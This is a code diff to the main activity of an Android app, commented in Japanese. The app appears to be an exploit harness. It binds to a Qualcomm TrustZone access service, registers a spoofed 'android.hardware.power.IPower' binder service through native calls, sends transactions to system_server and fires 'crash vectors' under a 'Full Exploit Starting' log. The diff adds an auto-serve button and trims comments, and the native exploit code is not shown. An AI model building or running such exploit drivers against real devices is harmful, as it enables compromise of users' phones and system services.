@@ -40,7 +40,7 @@ public class MainActivity extends AppCompatActivity {
     private static final String TARGET_CLS = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";
 
     private TextView tvStatus, tvLog;
-    private Button btnStart, btnStop, btnAddOnly, btnStartServer, btnSendTxn, btnCrash;
+    private Button btnStart, btnStop, btnAddOnly, btnStartServer, btnSendTxn, btnCrash, btnAutoServe;
     private Handler handler = new Handler(Looper.getMainLooper());
     private StringBuilder logBuilder = new StringBuilder();
     private IMinkSocketFd tzService;
@@ -73,6 +73,11 @@ public class MainActivity extends AppCompatActivity {
             View parent = (View) tvLog.getParent();
             if (parent instanceof ScrollView) ((ScrollView) parent).fullScroll(View.FOCUS_DOWN);
         });
+    }
+
+    // ステータス更新（UIスレッド）
+    private void updateStatus(final String status) {
+        handler.post(() -> tvStatus.setText(status));
     }
 
     private ServiceConnection tzConnection = new ServiceConnection() {
@@ -114,6 +119,7 @@ public class MainActivity extends AppCompatActivity {
         btnStartServer = findViewById(R.id.btn_start_server);
         btnSendTxn = findViewById(R.id.btn_send_txn);
         btnCrash = findViewById(R.id.btn_crash);
+        btnAutoServe = findViewById(R.id.btn_auto_serve);
 
         // JNI コールバックを設定
         nativeSetCallback(this);
@@ -185,8 +191,7 @@ public class MainActivity extends AppCompatActivity {
             nativeCrashVectors();
         });
 
-        // 自動実行オプション：サービス登録＋サーバー起動を一括で行う
-        findViewById(R.id.btn_auto_serve).setOnClickListener(v -> {
+        btnAutoServe.setOnClickListener(v -> {
             String name = "android.hardware.power.IPower";
             appendLog("Auto: registering and serving '" + name + "'");
             nativeRegisterAndServe(name);
@@ -244,6 +249,7 @@ public class MainActivity extends AppCompatActivity {
             btnStartServer.setEnabled(startEnabled);
             btnSendTxn.setEnabled(startEnabled);
             btnCrash.setEnabled(startEnabled);
+            btnAutoServe.setEnabled(startEnabled);
         });
     }
 
@@ -251,7 +257,7 @@ public class MainActivity extends AppCompatActivity {
         appendLog("========================================");
         appendLog("===== Full Exploit Starting =====");
 
-        // まずサービスを登録
+        // サービスを登録
         String serviceName = "android.hardware.power.IPower";
         int handle = nativeAddServiceOnly(serviceName);
         if (handle < 0) {
@@ -273,11 +279,11 @@ public class MainActivity extends AppCompatActivity {
             return;
         }
 
-        // システムにトランザクションを送信（system_server を刺激）
+        // システムにトランザクションを送信
         appendLog("Sending transaction to system...");
         nativeSendTransactionToSystem();
 
-        // クラッシュベクターも試す（オプション）
+        // クラッシュベクターも試す
         appendLog("Running crash vectors...");
         nativeCrashVectors();
 
@@ -286,7 +292,6 @@ public class MainActivity extends AppCompatActivity {
         for (int i = 0; i < 60; i++) {
             if (stopRequested.get()) break;
             try { Thread.sleep(1000); } catch (InterruptedException e) { break; }
-            // チェック用：ログを出力
             if (i % 10 == 0) appendLog("Waiting... " + i + "s");
         }
 
